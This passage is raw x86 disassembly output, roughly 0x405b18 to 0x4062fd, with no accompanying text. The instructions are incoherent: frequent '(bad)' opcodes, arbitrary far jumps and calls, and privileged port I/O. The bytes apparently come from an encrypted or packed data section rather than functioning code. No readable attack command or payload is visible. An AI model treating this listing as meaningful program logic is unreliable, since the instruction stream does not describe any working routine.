  405b18:	jmp    0xb03:0xd16f08b8
  405b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b20:	mov    cl,0x77
  405b22:	std    
  405b23:	inc    esi
  405b24:	add    edx,DWORD PTR [ebp-0x13]
  405b27:	xor    DWORD PTR [esi+0x15],esi
  405b2a:	adc    DWORD PTR [edx-0x31],0x4e
  405b2e:	adc    DWORD PTR [eax+ebx*4+0x3129a9df],ebp
  405b35:	inc    esp
  405b36:	aad    0xa2
  405b38:	adc    al,0x44
  405b3a:	call   0xbecc:0x18c566ca
  405b41:	mov    ebp,0x82ab4ca2
  405b46:	arpl   dx,bx
  405b48:	stos   BYTE PTR es:[edi],al
  405b49:	dec    edi
  405b4a:	mov    cl,0xcb
  405b4c:	push   eax
  405b4d:	inc    edx
  405b4e:	or     eax,0x85b779b3
  405b53:	stos   DWORD PTR es:[edi],eax
  405b54:	cmp    eax,0x97f75ce5
  405b59:	xor    BYTE PTR [edx-0x36],ah
  405b5c:	shl    DWORD PTR ds:0xdea03955,cl
  405b62:	test   BYTE PTR [eax-0x295e40a3],al
  405b68:	adc    DWORD PTR [eax+0x77c63e53],edx
  405b6e:	call   0xb15f:0xfb95ebc2
  405b75:	xchg   ebp,eax
  405b76:	mov    WORD PTR [eax],?
  405b78:	inc    edx
  405b79:	and    dh,BYTE PTR [edx-0xa2aad2e]
  405b7f:	pushf  
  405b80:	cdq    
  405b81:	mov    dh,0x12
  405b83:	shr    BYTE PTR [edi+0x3106ff67],1
  405b89:	pop    ebp
  405b8a:	popa   
  405b8b:	inc    edi
  405b8c:	mov    ebx,0x8f2c38a7
  405b91:	sbb    BYTE PTR [ebx+ecx*4+0x38632c2a],bh
  405b98:	in     al,dx
  405b99:	xlat   BYTE PTR ds:[ebx]
  405b9a:	mov    ecx,esp
  405b9c:	out    0x7a,eax
  405b9e:	pop    ecx
  405b9f:	cmp    DWORD PTR [ebx],eax
  405ba1:	loope  0x405b58
  405ba3:	jp     0x405b66
  405ba5:	mov    al,ds:0x2f59ea3b
  405baa:	sbb    eax,0x7deea92c
  405baf:	ins    BYTE PTR es:[edi],dx
  405bb0:	or     esi,esi
  405bb2:	aas    
  405bb3:	adc    al,0x7d
  405bb6:	and    eax,0x8dc74d8
  405bbb:	(bad)  [ebx-0x2015a87d]
  405bc1:	mov    dh,0xce
  405bc3:	fcomp  DWORD PTR [edi]
  405bc5:	adc    al,0x57
  405bc7:	repnz pop ebx
  405bc9:	shr    DWORD PTR [ebp*4+0x7f211165],cl
  405bd0:	mov    edi,0xb9824d7
  405bd5:	mov    WORD PTR ds:0x42760e1,?
  405bdb:	adc    DWORD PTR ds:0x9a268dfc,eax
  405be1:	popf   
  405be2:	inc    edi
  405be3:	ins    BYTE PTR es:[edi],dx
  405be4:	push   0x54605b2
  405be9:	pop    eax
  405bea:	fiadd  DWORD PTR [eax-0x290c02c5]
  405bf0:	and    dl,dh
  405bf2:	enter  0x65bc,0xac
  405bf6:	push   ebx
  405bf7:	jmp    0xb95edb8e
  405bfc:	dec    eax
  405bfd:	lahf   
  405bfe:	fisttp WORD PTR [eax]
  405c00:	push   0x575af59f
  405c05:	jmp    DWORD PTR [esi-0x11]
  405c08:	add    al,0x6b
  405c0a:	and    eax,0x7ebecaa3
  405c0f:	ret    
  405c10:	daa    
  405c11:	push   ss
  405c12:	loopne 0x405b9f
  405c14:	xchg   ebx,eax
  405c15:	add    eax,0x161670b3
  405c1a:	sbb    al,0x3d
  405c1c:	addr16 ret 0x87aa
  405c20:	lods   al,BYTE PTR ds:[esi]
  405c21:	xor    BYTE PTR [eax-0x179a2dbb],bh
  405c27:	lods   al,BYTE PTR ds:[esi]
  405c28:	add    al,BYTE PTR [eax-0x332ee7f]
  405c2e:	test   BYTE PTR [edx-0x29e3f522],cl
  405c34:	faddp  st(6),st
  405c36:	fnstsw WORD PTR [ecx-0x31]
  405c39:	dec    esi
  405c3a:	aaa    
  405c3b:	popa   
  405c3c:	(bad)  
  405c3d:	call   0xbe89:0x3ce88f8d
  405c44:	iret   
  405c45:	mov    edx,0xc156b8b1
  405c4a:	pop    es
  405c4b:	pop    ebp
  405c4c:	xor    eax,0xef67e5f2
  405c51:	addr16 mov ecx,0xf73cd1ee
  405c57:	fcom   QWORD PTR [ecx-0x35]
  405c5a:	imul   ebp,DWORD PTR [esi-0x38fd85c2],0x32
  405c61:	xor    cl,al
  405c63:	xchg   ebx,eax
  405c64:	inc    ebp
  405c65:	pop    ss
  405c66:	xor    al,0x77
  405c68:	jge    0x405c7c
  405c6a:	mov    eax,0xe9e75f21
  405c6f:	in     eax,dx
  405c70:	pushf  
  405c71:	inc    edi
  405c72:	inc    esp
  405c73:	sbb    al,0x5f
  405c75:	and    BYTE PTR [edx-0x4a],0x3
  405c79:	or     DWORD PTR [ecx],ecx
  405c7b:	xchg   edx,eax
  405c7c:	sbb    DWORD PTR [ecx+0x63987a1b],ebx
  405c82:	es repz pop ecx
  405c85:	push   edx
  405c86:	mov    eax,ds:0x998c11eb
  405c8b:	push   0x5c
  405c8d:	les    esp,FWORD PTR [esi+edx*8]
  405c90:	fdivr  QWORD PTR [eax]
  405c92:	sub    BYTE PTR [esi],dh
  405c94:	in     eax,dx
  405c95:	ss mov dl,0x3d
  405c98:	and    al,0xfc
  405c9a:	retf   0x227d
  405c9d:	jle    0x405d19
  405c9f:	xchg   ecx,eax
  405ca0:	enter  0x4448,0xb
  405ca4:	cmc    
  405ca5:	and    al,0x8a
  405ca7:	mov    DWORD PTR ds:0xaac362f7,ebx
  405cad:	add    BYTE PTR [eax+0x13dc6f0a],cl
  405cb3:	out    dx,al
  405cb4:	cs push cs
  405cb6:	add    esp,esp
  405cb8:	cs mov esp,0xd638ef1
  405cbe:	push   0xffffff8e
  405cc0:	add    ecx,DWORD PTR [ebx+0x17]
  405cc3:	add    al,0x1e
  405cc5:	mov    ds:0x7f7f8338,eax
  405cca:	ficomp WORD PTR [ebp-0x1d]
  405ccd:	jno    0x405c84
  405ccf:	mov    cl,0xd
  405cd1:	mov    al,ds:0xa413cf93
  405cd6:	mov    dl,0xae
  405cd8:	aas    
  405cd9:	inc    ebx
  405cda:	fwait
  405cdb:	inc    edi
  405cdc:	pusha  
  405cdd:	or     DWORD PTR [ebx-0x58ae1b86],0xca74ca9b
  405ce7:	jl     0x405cc2
  405ce9:	mov    cl,0x2e
  405ceb:	add    al,0xc2
  405ced:	es xchg ebp,eax
  405cef:	dec    eax
  405cf0:	stos   BYTE PTR es:[edi],al
  405cf1:	loop   0x405ce0
  405cf3:	das    
  405cf4:	jnp    0x405d2b
  405cf6:	push   ecx
  405cf7:	xor    al,0x15
  405cf9:	xor    eax,0x2e3184d7
  405cff:	aas    
  405d00:	in     al,0x75
  405d02:	xchg   ebp,eax
  405d03:	gs cmp al,0x3d
  405d06:	mov    ah,0x1a
  405d08:	push   es
  405d09:	pop    esi
  405d0a:	inc    BYTE PTR [ebx]
  405d0c:	enter  0x655f,0xd3
  405d10:	sar    bl,1
  405d12:	fcom   QWORD PTR [edx]
  405d14:	cmp    eax,0xd5237ca5
  405d19:	cmp    BYTE PTR [edx+0x57],cl
  405d1c:	fistp  WORD PTR [eax+0x61]
  405d1f:	scas   al,BYTE PTR es:[edi]
  405d20:	push   edi
  405d21:	call   0x7439:0xcbcbe284
  405d28:	ret    0xd340
  405d2b:	test   eax,0xdc310bfa
  405d30:	mov    esi,0xcbce3e90
  405d35:	and    al,0xcc
  405d37:	shr    BYTE PTR [edi+0x5b561d83],cl
  405d3d:	xlat   BYTE PTR ds:[ebx]
  405d3e:	sbb    edx,esp
  405d40:	push   ds
  405d41:	or     al,0x25
  405d43:	ret    
  405d44:	dec    edx
  405d45:	adc    edi,DWORD PTR [ecx-0x5a990352]
  405d4b:	sahf   
  405d4c:	(bad)  
  405d4d:	and    eax,0x5832f9d0
  405d52:	adc    al,0x8a
  405d54:	push   ebp
  405d55:	ret    
  405d56:	ins    DWORD PTR es:[edi],dx
  405d57:	call   FWORD PTR [ecx]
  405d59:	mov    dh,0x8b
  405d5b:	add    DWORD PTR [edx],esp
  405d5d:	(bad)  
  405d5e:	retf   0xa731
  405d61:	repnz sti 
  405d63:	pushaw 
  405d65:	or     ah,ch
  405d67:	xor    al,0x70
  405d69:	repz jb 0x405d4a
  405d6c:	lock or cl,BYTE PTR [ecx]
  405d6f:	jb     0x405d45
  405d71:	test   DWORD PTR [esi],eax
  405d73:	mov    edi,0x13f0aa42
  405d78:	pushf  
  405d79:	push   edx
  405d7a:	push   0xffffffd7
  405d7c:	pop    eax
  405d7d:	loop   0x405d2c
  405d7f:	xchg   edi,eax
  405d80:	popa   
  405d81:	adc    bh,BYTE PTR [edx]
  405d83:	xchg   esi,eax
  405d84:	push   0x42
  405d86:	xchg   edi,eax
  405d87:	cmp    al,0x26
  405d89:	cli    
  405d8a:	ins    DWORD PTR es:[edi],dx
  405d8b:	mov    cl,BYTE PTR [ecx-0x1f5aa7ff]
  405d91:	pop    ecx
  405d92:	scas   eax,DWORD PTR es:[edi]
  405d93:	popa   
  405d94:	ret    0x7b97
  405d97:	jg     0x405d69
  405d99:	cli    
  405d9a:	sbb    DWORD PTR [eax],ebx
  405d9c:	retf   
  405d9d:	aas    
  405d9e:	or     DWORD PTR ds:0x90ffb21b,0xffffffb5
  405da5:	inc    edi
  405da6:	xor    al,0x90
  405da8:	popf   
  405da9:	popf   
  405daa:	xor    eax,0xb01691ee
  405daf:	or     edx,esp
  405db1:	jmp    0x405dc8
  405db3:	pop    ebx
  405db4:	push   ebp
  405db5:	xor    DWORD PTR [ecx*8+0x5a8708c5],0xffffffae
  405dbd:	scas   eax,DWORD PTR es:[edi]
  405dbe:	and    DWORD PTR [ecx+0x21],esi
  405dc1:	fidivr WORD PTR [ebp-0x47a625a9]
  405dc7:	and    BYTE PTR [ebp+0x419ef385],ah
  405dcd:	mov    ebp,0x442aaed9
  405dd2:	int    0x8c
  405dd4:	mov    ebp,0x7c0c55ab
  405dd9:	lods   al,BYTE PTR ds:[esi]
  405dda:	mov    dh,0xc8
  405ddc:	jp     0x405e4e
  405dde:	popa   
  405ddf:	sahf   
  405de0:	leave  
  405de1:	cmp    ah,dl
  405de3:	inc    ebp
  405de4:	lock xchg ecx,eax
  405de6:	inc    ebp
  405de7:	(bad)  
  405de8:	retf   
  405de9:	jle    0x405e4b
  405deb:	and    BYTE PTR [eax],cl
  405ded:	cwde   
  405dee:	add    BYTE PTR [edx-0x79f7658],ah
  405df4:	pop    eax
  405df5:	rol    BYTE PTR fs:[edi-0x79c7ac37],cl
  405dfc:	xor    eax,0x8a5e720f
  405e01:	into   
  405e02:	adc    DWORD PTR [ebx],ebp
  405e04:	mov    eax,0x159a72a4
  405e09:	test   BYTE PTR [ebx],ah
  405e0b:	inc    edi
  405e0c:	mov    ds:0xe94e1d3e,eax
  405e11:	test   bh,dh
  405e13:	out    0xb7,al
  405e15:	cwde   
  405e16:	nop
  405e17:	adc    BYTE PTR [eax+0x3c6f5f60],ah
  405e1d:	fistp  QWORD PTR [ecx]
  405e1f:	int3   
  405e20:	mov    eax,0x65f66ad8
  405e25:	loope  0x405daf
  405e27:	jl     0x405e62
  405e29:	sti    
  405e2a:	aas    
  405e2b:	mov    eax,0x9407fa97
  405e30:	loope  0x405dfc
  405e32:	div    BYTE PTR [esi-0x39]
  405e35:	test   al,0x51
  405e37:	inc    edi
  405e38:	rcr    DWORD PTR [ecx+esi*4],cl
  405e3b:	rol    DWORD PTR [ebp+edx*8+0x77],0x70
  405e40:	das    
  405e41:	dec    edi
  405e42:	in     al,dx
  405e43:	fwait
  405e44:	lahf   
  405e45:	out    dx,al
  405e46:	sbb    DWORD PTR [eax+ebx*2+0x2c31f738],eax
  405e4d:	leave  
  405e4e:	ret    0x8057
  405e51:	mov    bh,0x8a
  405e53:	cmc    
  405e54:	cdq    
  405e55:	js     0x405e6b
  405e57:	cdq    
  405e58:	push   esi
  405e59:	lock and ch,ah
  405e5c:	mov    bh,0xd9
  405e5e:	sub    eax,0xa77c3952
  405e63:	cmp    esi,ebp
  405e65:	push   ds
  405e66:	pop    edi
  405e67:	lahf   
  405e68:	dec    eax
  405e69:	mov    cl,0xd7
  405e6b:	mov    esi,0x4048f01c
  405e70:	xor    bh,cl
  405e72:	cmp    al,0x0
  405e74:	retf   0x214a
  405e77:	or     eax,0x55
  405e7a:	xor    al,0x6e
  405e7c:	daa    
  405e7d:	cmc    
  405e7e:	aam    0xab
  405e80:	lods   eax,DWORD PTR ds:[esi]
  405e81:	inc    eax
  405e82:	jnp    0x405e8b
  405e84:	ins    BYTE PTR es:[edi],dx
  405e85:	mov    al,0x3b
  405e87:	fisttp WORD PTR [ebx-0x3f64d033]
  405e8d:	fsub   QWORD PTR fs:[esi]
  405e90:	data16 mov ch,0xfe
  405e93:	push   es
  405e94:	push   eax
  405e95:	repz test al,0xad
  405e98:	out    0x15,al
  405e9a:	dec    ecx
  405e9b:	pop    esp
  405e9c:	sub    BYTE PTR [ebx-0x2610d2ac],ah
  405ea2:	add    bl,BYTE PTR [esi]
  405ea4:	ja     0x405e6d
  405ea6:	cmp    DWORD PTR [eax+edi*1+0x32e0a7b8],ebp
  405ead:	iret   
  405eae:	jge    0x405ec7
  405eb0:	js     0x405e5b
  405eb2:	mov    dh,0xc
  405eb4:	pop    edx
  405eb5:	adc    eax,0xa627c8eb
  405eba:	rep outs dx,BYTE PTR ds:[esi]
  405ebc:	mov    ch,0xfb
  405ebe:	std    
  405ebf:	jl     0x405f2c
  405ec1:	xchg   esi,eax
  405ec2:	aas    
  405ec3:	loop   0x405ec8
  405ec5:	mov    esi,0xb96dd455
  405eca:	shl    DWORD PTR [ebx-0x65],1
  405ecd:	mov    al,0x42
  405ecf:	shl    BYTE PTR [ecx+0x76],1
  405ed2:	shr    DWORD PTR [edx+0x1e],0xb4
  405ed6:	cli    
  405ed7:	imul   eax,eax,0x3864a0e2
  405edd:	ja     0x405f4d
  405edf:	loope  0x405ed0
  405ee1:	adc    edx,DWORD PTR [edx-0x716c105e]
  405ee7:	mov    ebp,DWORD PTR [ebp+edi*2+0x60134f3c]
  405eee:	xchg   ebx,eax
  405eef:	sbb    BYTE PTR [edi+0x3b],bh
  405ef2:	push   esp
  405ef3:	lods   al,BYTE PTR ds:[esi]
  405ef4:	scas   eax,DWORD PTR es:[edi]
  405ef5:	or     ch,bh
  405ef7:	sub    bl,BYTE PTR [edi+0x445196b]
  405efd:	retf   0x4269
  405f00:	push   eax
  405f01:	pop    edi
  405f02:	inc    ebx
  405f03:	lods   eax,DWORD PTR ds:[esi]
  405f04:	pop    ebp
  405f05:	addr16 popa 
  405f07:	sbb    eax,0xeae88d0
  405f0c:	fild   QWORD PTR [eax]
  405f0e:	xor    BYTE PTR [edx],bh
  405f10:	addr16 pusha 
  405f12:	mov    esi,0x570b044d
  405f17:	cmp    ah,bl
  405f19:	clc    
  405f1a:	push   ebx
  405f1b:	push   edx
  405f1c:	sar    BYTE PTR [ecx+0x3e],1
  405f1f:	mov    BYTE PTR [ebx-0x51],bl
  405f22:	push   ebp
  405f23:	inc    esp
  405f24:	icebp  
  405f25:	push   ebx
  405f26:	rol    BYTE PTR [edx-0x25],cl
  405f29:	and    edi,DWORD PTR [edi]
  405f2b:	into   
  405f2c:	pop    edx
  405f2d:	cmp    eax,0xde1efb19
  405f32:	retf   
  405f33:	out    0xca,al
  405f35:	lods   eax,DWORD PTR ds:[esi]
  405f36:	sbb    BYTE PTR [ecx],ch
  405f38:	fcos   
  405f3a:	add    BYTE PTR [edi+0x74],0xea
  405f3e:	add    dh,BYTE PTR [eax+esi*1+0x1b]
  405f42:	aaa    
  405f43:	dec    edx
  405f44:	cld    
  405f45:	and    al,0x19
  405f47:	sub    al,0xb8
  405f49:	mov    ah,0x4d
  405f4b:	push   cs
  405f4c:	inc    al
  405f4e:	push   es
  405f4f:	popa   
  405f50:	nop
  405f51:	pop    edx
  405f52:	inc    ecx
  405f53:	bound  eax,QWORD PTR [ecx-0x6e]
  405f56:	das    
  405f57:	sahf   
  405f58:	lock cmp DWORD PTR ds:[edx-0x22],0x8dbfab2a
  405f61:	fsub   DWORD PTR [ebx+0xc]
  405f64:	jne    0x405efb
  405f66:	dec    edx
  405f67:	push   0x6a
  405f69:	mov    al,0xf9
  405f6b:	(bad)  
  405f6c:	ja     0x405fda
  405f6e:	and    BYTE PTR [ebp-0x4fe5533b],0xb2
  405f75:	outs   dx,BYTE PTR ds:[esi]
  405f76:	xchg   esp,eax
  405f77:	into   
  405f78:	addr16 (bad) 
  405f7a:	cdq    
  405f7b:	jo     0x405f2a
  405f7d:	dec    ebp
  405f7e:	pop    ss
  405f7f:	idiv   BYTE PTR [edx-0x3c]
  405f82:	and    eax,0x894c0cf
  405f87:	jmp    0x488c757e
  405f8c:	add    BYTE PTR [esi-0x34],0x9
  405f90:	fcom   DWORD PTR [eax+0x58b23ee2]
  405f96:	call   0x45ab181d
  405f9b:	xor    eax,0x1933cbe5
  405fa0:	dec    edx
  405fa1:	daa    
  405fa2:	mov    al,0xaa
  405fa4:	(bad)  
  405fa5:	push   edx
  405fa6:	push   esi
  405fa7:	xor    bh,ch
  405fa9:	stos   BYTE PTR es:[edi],al
  405faa:	mov    ebx,DWORD PTR [ecx-0x288b7c12]
  405fb0:	(bad)  
  405fb1:	mov    ds:0xf6b39452,al
  405fb6:	mov    BYTE PTR [edx+0x12],ch
  405fb9:	mov    al,ds:0x9373dfba
  405fbe:	lahf   
  405fbf:	cmp    al,0x3d
  405fc1:	fisttp WORD PTR [esi]
  405fc3:	daa    
  405fc4:	xor    DWORD PTR [ebx],0xdb4ce8ca
  405fca:	lods   eax,DWORD PTR ds:[esi]
  405fcb:	and    al,0xd2
  405fcd:	gs icebp 
  405fcf:	in     eax,dx
  405fd0:	add    al,0x1c
  405fd2:	hlt    
  405fd3:	mov    ds:0xa592b66d,al
  405fd8:	fdiv   QWORD PTR [eax+0x42]
  405fdb:	out    0xcb,eax
  405fdd:	imul   edx,DWORD PTR [ebp-0x5fac092e],0xe0b1bc3c
  405fe7:	push   ebx
  405fe8:	test   dh,ch
  405fea:	mov    ds:0x2e627a7d,al
  405fef:	push   cs
  405ff0:	mov    dh,0xa4
  405ff2:	pop    ecx
  405ff3:	pop    eax
  405ff4:	xor    ecx,DWORD PTR [eax-0x4be96d27]
  405ffa:	ja     0x405fac
  405ffc:	mov    ah,0xfe
  405ffe:	aam    0xde
  406000:	mov    edx,0xd5840ef0
  406005:	call   0xf747567e
  40600a:	pop    eax
  40600b:	jge    0x40604d
  40600d:	mov    ebp,0x643cc24a
  406012:	lock sub BYTE PTR [ecx+0x5742468],dl
  406019:	xor    esi,DWORD PTR [esi+0x53]
  40601c:	cwde   
  40601d:	inc    ecx
  40601e:	inc    ecx
  40601f:	fs push eax
  406021:	sub    BYTE PTR [ecx+0x61],0xc7
  406025:	fs pop edx
  406027:	inc    eax
  406028:	call   0xb8be:0x222adaa6
  40602f:	sub    ebp,esi
  406031:	jb     0x4060ab
  406033:	add    BYTE PTR [ecx-0x1a],0x66
  406037:	in     eax,0x70
  406039:	retf   
  40603a:	pop    ds
  40603b:	jp     0x40609f
  40603d:	pusha  
  40603e:	fimul  DWORD PTR [ebx+0x71]
  406041:	dec    ebp
  406042:	mov    WORD PTR [ebp+esi*2-0x4ed470ee],ss
  406049:	jmp    0x1ebb3126
  40604e:	sub    esi,edx
  406050:	or     ecx,eax
  406052:	addr16 mov ah,0x92
  406055:	inc    ebx
  406056:	nop
  406057:	rcr    BYTE PTR [esi-0x594b74ac],1
  40605d:	mov    dh,0xc5
  40605f:	(bad)  
  406060:	mov    ecx,0xbe9f696b
  406065:	mov    al,ds:0x8e518345
  40606a:	cmc    
  40606b:	add    BYTE PTR [ecx-0x63],cl
  40606e:	stc    
  40606f:	inc    ebp
  406070:	push   esi
  406071:	fst    QWORD PTR ds:0xaabad35
  406077:	sbb    al,0x86
  406079:	nop
  40607a:	ss mov bl,0xa1
  40607d:	jns    0x406043
  40607f:	xor    esp,DWORD PTR [ebx]
  406081:	mov    ebx,0x76a5829c
  406086:	stos   BYTE PTR es:[edi],al
  406087:	mov    esi,0x5f2fe436
  40608c:	dec    ecx
  40608d:	jmp    0xde1c:0xfbc5e0e7
  406094:	pop    ss
  406095:	test   eax,0x564de532
  40609a:	cmc    
  40609b:	push   esi
  40609c:	nop
  40609d:	scas   eax,DWORD PTR es:[edi]
  40609e:	jbe    0x406083
  4060a0:	inc    ebx
  4060a1:	mov    edx,0x7d2ab52a
  4060a6:	fsubr  QWORD PTR [ebp+0x7a]
  4060a9:	aad    0x7f
  4060ab:	or     al,0xd3
  4060ad:	and    bh,BYTE PTR [ebp-0x327437d]
  4060b3:	xchg   esp,eax
  4060b4:	iret   
  4060b5:	xchg   edx,eax
  4060b6:	jbe    0x40605b
  4060b8:	pop    es
  4060b9:	scas   eax,DWORD PTR es:[edi]
  4060ba:	das    
  4060bb:	sub    BYTE PTR [eax-0x4ea677f5],dl
  4060c1:	xor    ebp,DWORD PTR [eax+edi*1]
  4060c4:	push   ss
  4060c5:	rol    BYTE PTR [eax],0xd5
  4060c8:	sbb    BYTE PTR [ebx+ecx*1-0x29dca38f],0x6e
  4060d0:	rcl    DWORD PTR [eax],0x1
  4060d3:	jno    0x406077
  4060d5:	dec    ecx
  4060d6:	mov    eax,0x8121a73
  4060db:	out    0x8b,al
  4060dd:	mov    edx,0x3c2bd0a2
  4060e2:	push   cs
  4060e3:	dec    edi
  4060e4:	cld    
  4060e5:	mov    ds:0xa4f1ad89,al
  4060ea:	mov    WORD PTR [esp+edx*2-0x4d],?
  4060ee:	pushf  
  4060ef:	mov    cl,0xe4
  4060f1:	std    
  4060f2:	pop    eax
  4060f3:	lods   eax,DWORD PTR ds:[esi]
  4060f4:	xchg   esp,eax
  4060f5:	les    edx,FWORD PTR [ecx+0x2a]
  4060f8:	fs pop es
  4060fa:	out    0x20,al
  4060fc:	adc    dh,BYTE PTR [edi+0xe]
  4060ff:	mov    al,0x6d
  406101:	mov    BYTE PTR [edi],dh
  406103:	mul    edx
  406105:	adc    eax,0xc7234bfc
  40610a:	jg     0x406115
  40610c:	adc    al,0xe0
  40610e:	adc    ebp,ebp
  406110:	cmp    ax,0xb869
  406114:	rcl    BYTE PTR [edi+edx*8+0x68],1
  406118:	xchg   ecx,eax
  406119:	lea    ebp,[eax+0x31]
  40611c:	add    eax,DWORD PTR [esi]
  40611e:	sar    DWORD PTR [esi-0x3c],1
  406121:	dec    esp
  406122:	dec    ebx
  406123:	push   0xfffffff9
  406125:	push   ebx
  406126:	fdiv   DWORD PTR [ecx]
  406128:	pushf  
  406129:	fimul  DWORD PTR [esi+0x29d78765]
  40612f:	and    cl,BYTE PTR [edx]
  406131:	outs   dx,DWORD PTR ds:[esi]
  406132:	shr    esi,0x18
  406135:	sbb    DWORD PTR [ebx],eax
  406137:	(bad)  
  406139:	dec    edi
  40613a:	fcmove st,st(3)
  40613c:	cli    
  40613d:	cmp    eax,DWORD PTR [edx-0x31]
  406140:	mov    ah,0x42
  406142:	pop    ecx
  406143:	push   edx
  406144:	fwait
  406145:	cdq    
  406146:	(bad)  
  406147:	cmc    
  406148:	adc    esi,0x3b
  40614b:	fldcw  WORD PTR ds:0x8e82fda8
  406151:	jmp    0x6bdd:0x3d35d5e9
  406158:	test   eax,0x917e7f86
  40615d:	out    dx,eax
  40615e:	mov    cl,0xf2
  406160:	mov    esp,DWORD PTR [esi+esi*1-0x16]
  406164:	sub    al,0xe0
  406166:	push   ds
  406167:	ror    dl,0xf7
  40616a:	lahf   
  40616b:	cmp    dl,BYTE PTR [eax+0x12]
  40616e:	mov    DWORD PTR [edi],edi
  406170:	xor    eax,0xd9f4abec
  406175:	leave  
  406176:	pop    ebp
  406177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406178:	add    al,0xbe
  40617a:	test   DWORD PTR [ebp-0x14],eax
  40617d:	and    BYTE PTR [edi+ebx*2-0x5e119291],al
  406184:	mov    eax,ss
  406186:	icebp  
  406187:	inc    ebx
  406188:	mov    al,ds:0x24691537
  40618d:	out    dx,eax
  40618e:	xor    bl,dh
  406190:	xor    BYTE PTR [esi+0x80f807f],dh
  406196:	rcr    BYTE PTR [edx],0xc2
  406199:	loopne 0x406215
  40619b:	dec    ebx
  40619c:	push   edx
  40619d:	es stc 
  40619f:	sub    BYTE PTR [ecx],ah
  4061a1:	jg     0x406161
  4061a3:	cmp    BYTE PTR es:[edx-0x58],0x4b
  4061a8:	paddsb mm7,QWORD PTR [edx]
  4061ab:	sti    
  4061ac:	out    dx,eax
  4061ad:	rcl    bh,1
  4061af:	dec    edx
  4061b0:	cdq    
  4061b1:	add    edi,DWORD PTR [ecx+0x58997828]
  4061b7:	mov    WORD PTR [eax],?
  4061b9:	nop
  4061ba:	sub    cl,BYTE PTR [edx+0x3e]
  4061bd:	jb     0x4061d9
  4061bf:	or     DWORD PTR [ecx],esp
  4061c1:	lods   eax,DWORD PTR ds:[esi]
  4061c2:	jmp    0xb0ca5c24
  4061c7:	dec    DWORD PTR [ecx]
  4061c9:	idiv   BYTE PTR [edx-0x13c677bb]
  4061cf:	sbb    al,0xd9
  4061d1:	adc    ebx,DWORD PTR [edi-0x5bb14cb]
  4061d7:	dec    esp
  4061d8:	pcmpgtd mm7,QWORD PTR [edi]
  4061db:	(bad)  
  4061dc:	sub    DWORD PTR ds:0x9ef4c26e,esi
  4061e2:	vpcmpeqb ymm3,ymm0,YMMWORD PTR [edx+0x5a803b37]
  4061ea:	ja     0x4061e0
  4061ec:	scas   al,BYTE PTR es:[edi]
  4061ed:	aam    0x1b
  4061ef:	fcomi  st,st(4)
  4061f1:	mov    edx,0xe50f8e93
  4061f6:	call   0x35fb8488
  4061fb:	sub    ah,BYTE PTR [edx]
  4061fd:	jle    0x406186
  4061ff:	add    eax,DWORD PTR [ebx]
  406201:	call   0x7921:0x3727f452
  406208:	push   ss
  406209:	retf   
  40620a:	push   0xd199a949
  40620f:	or     cl,BYTE PTR [eax]
  406211:	div    DWORD PTR [edi-0x66ce1714]
  406217:	in     al,0xf0
  406219:	cmp    BYTE PTR [eax+ebx*8+0x3291b361],dl
  406220:	dec    esp
  406221:	cmp    ebx,edi
  406223:	jle    0x406277
  406225:	in     al,dx
  406226:	xchg   esi,eax
  406227:	push   edx
  406228:	dec    esp
  406229:	mov    ds:0xcef0d3cc,al
  40622e:	cli    
  40622f:	hlt    
  406230:	adc    DWORD PTR [edx],edi
  406232:	push   0xffffffcc
  406234:	mov    dl,0x3d
  406236:	sub    ebp,DWORD PTR ds:0x610a5bb6
  40623c:	inc    ecx
  40623d:	mov    al,ds:0x90e585d6
  406242:	lahf   
  406243:	add    ecx,ebp
  406245:	xor    eax,0xccf7a6b1
  40624a:	push   0xffffffe9
  40624c:	outs   dx,DWORD PTR ds:[esi]
  40624d:	sbb    eax,0x7c841ff2
  406252:	mov    al,0xa8
  406254:	scas   eax,DWORD PTR es:[edi]
  406255:	inc    eax
  406256:	ret    
  406257:	xor    esp,esi
  406259:	cld    
  40625a:	jl     0x4062c9
  40625c:	cmc    
  40625d:	sub    al,0xe0
  40625f:	add    eax,0x2647c244
  406264:	test   bh,al
  406266:	adc    DWORD PTR [edx-0x7edd116],esi
  40626c:	aam    0xa2
  40626e:	fdiv   DWORD PTR [esi+0x56321043]
  406274:	(bad)  
  406275:	popf   
  406276:	xchg   ebp,eax
  406277:	jmp    0x40624f
  406279:	addr16 pop edx
  40627b:	or     DWORD PTR [esi+0x36],ebp
  40627e:	sub    cl,0x52
  406281:	cmp    al,0x1d
  406283:	adc    al,0x87
  406285:	div    DWORD PTR [eax+0x30]
  406288:	or     al,0x44
  40628a:	push   edx
  40628b:	add    al,0xe2
  40628d:	shr    BYTE PTR [eax-0x2ba328e0],0xc7
  406294:	ss test al,0x68
  406297:	xchg   ebp,eax
  406298:	lea    esi,[ebx+0xf]
  40629b:	inc    ebp
  40629c:	xchg   esp,eax
  40629d:	mov    WORD PTR [edi-0xace2d90],es
  4062a3:	shl    DWORD PTR [eax-0x4f],0xf5
  4062a7:	leave  
  4062a8:	cmp    edi,DWORD PTR [ebx]
  4062aa:	push   ecx
  4062ab:	pop    ss
  4062ac:	add    esi,edx
  4062ae:	and    DWORD PTR [eax-0x5c],ebx
  4062b1:	sub    eax,0xdb0736e8
  4062b6:	push   es
  4062b7:	sub    al,BYTE PTR ds:0x1c79e90b
  4062bd:	jmp    0x89b892c9
  4062c2:	(bad)  
  4062c3:	jl     0x4062d9
  4062c5:	idiv   DWORD PTR [esi]
  4062c7:	sbb    eax,DWORD PTR [eax]
  4062c9:	lods   eax,DWORD PTR ds:[esi]
  4062ca:	(bad)  
  4062cb:	(bad)  
  4062cc:	xor    ebp,DWORD PTR [edi+0x212c198f]
  4062d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062d3:	mov    ebp,0x8b5a6a48
  4062d8:	jne    0x40633f
  4062da:	pop    ss
  4062db:	add    DWORD PTR [ebp-0x4887d5c5],eax
  4062e1:	pop    esi
  4062e2:	push   edx
  4062e3:	mov    dh,0x17
  4062e5:	adc    ebp,eax
  4062e7:	imul   esi,DWORD PTR [edx],0xfffffff5
  4062ea:	gs mov al,0xd4
  4062ed:	cwde   
  4062ee:	jbe    0x406308
  4062f0:	mov    ebp,0xf619736c
  4062f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062f6:	loop   0x4062cb
  4062f8:	outs   dx,BYTE PTR ds:[esi]
  4062f9:	cdq    
  4062fa:	push   ss
  4062fb:	xor    BYTE PTR [ecx],ch
  4062fd:	push   edx
